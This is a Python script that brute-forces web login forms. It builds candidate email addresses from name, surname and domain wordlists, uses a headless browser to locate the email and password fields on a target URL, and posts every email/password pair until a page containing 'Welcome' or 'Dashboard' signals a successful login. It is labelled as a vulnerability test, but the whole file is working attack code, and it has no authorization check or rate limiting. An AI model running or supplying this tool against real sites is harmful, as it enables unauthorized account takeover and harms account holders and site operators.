import requests
from playwright.async_api import async_playwright
import asyncio

def load_wordlist(file_path):
    #Load a wordlist file and return its content as a list.
    try:
        with open(file_path, "r") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"Wordlist file not found: {file_path}")
        return []
    except Exception as e:
        print(f"Error loading wordlist: {e}")
        return []

def generate_emails(names, lastnames, domains):
    #Generates email combinations from names, last names, and domains.
    emails = []
    for name in names:
        for lastname in lastnames:
            for domain in domains:
                emails.append(f"{name.lower()}.{lastname.lower()}@{domain}")
                emails.append(f"{name.lower()}@{domain}")
                emails.append(f"{lastname.lower()}@{domain}")
    return emails

async def brute_force_attack(target_url):

    #Simulates a brute force attack by testing dynamically generated email/password combinations.
    async def detect_fields(url):

        #Detects email and password fields on a web page.
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            page = await browser.new_page()

            try:
                await page.goto(url)
                await page.wait_for_load_state("networkidle")
                selectors = ["input", "form"]
                detected_fields = {}

                for selector in selectors:
                    elements = await page.query_selector_all(selector)
                    for element in elements:
                        field_type = await element.get_attribute("type")
                        field_name = await element.get_attribute("name")
                        field_id = await element.get_attribute("id")
                        detected_fields[field_id or field_name or selector] = {
                            "id": field_id,
                            "name": field_name,
                            "type": field_type,
                            "tag": selector
                        }
                return detected_fields
            finally:
                await browser.close()

    def test_brute_force(url, emails, passwords, email_field, password_field):
        #Tests a login form for brute force vulnerabilities using a dictionary of credentials.
        results = []
        for email in emails:
            for password in passwords:
                try:
                    payload = {email_field: email, password_field: password}
                    response = requests.post(url, data=payload, timeout=5)
                    results.append({
                        "email": email,
                        "password": password,
                        "response_code": response.status_code,
                        "success": "Welcome" in response.text or "Dashboard" in response.text
                    })

                    # Stop testing if a successful login is found
                    if results[-1]["success"]:
                        return results
                except requests.exceptions.RequestException as e:
                    results.append({
                        "email": email,
                        "password": password,
                        "error": str(e)
                    })
        return results

    # Step 1: Load names, lastnames, and domains from .txt files
    names = load_wordlist("names.txt")  # Replace with the path to your names.txt file
    lastnames = load_wordlist("lastnames.txt")  # Replace with the path to your lastnames.txt file
    domains = load_wordlist("domains.txt")  # Replace with the path to your domains.txt file
    passwords = load_wordlist("passwords.txt")  # Replace with the path to your passwords.txt file

    if not names or not lastnames or not domains or not passwords:
        return {"message": "One or more wordlists are missing or empty.", "vulnerable": False}

    # Generate emails dynamically
    email_list = generate_emails(names, lastnames, domains)

    # Step 2: Detect fields on the target URL
    fields = await detect_fields(target_url)
    if not fields:
        return {"message": "No fields detected.", "vulnerable": False}

    # Filter for email and password fields
    email_field = next((field for field, details in fields.items() if details["type"] == "email"), None)
    password_field = next((field for field, details in fields.items() if details["type"] == "password"), None)

    if not email_field or not password_field:
        return {"message": "Email and password fields not detected.", "vulnerable": False}

    # Step 3: Test for brute force vulnerabilities
    results = test_brute_force(target_url, email_list, passwords, email_field, password_field)

    # Summarize vulnerabilities
    vulnerable = any(result.get("success", False) for result in results)
    message = "Brute force vulnerabilities detected." if vulnerable else "No brute force vulnerabilities detected."
    return {"message": message, "details": results, "vulnerable": vulnerable}
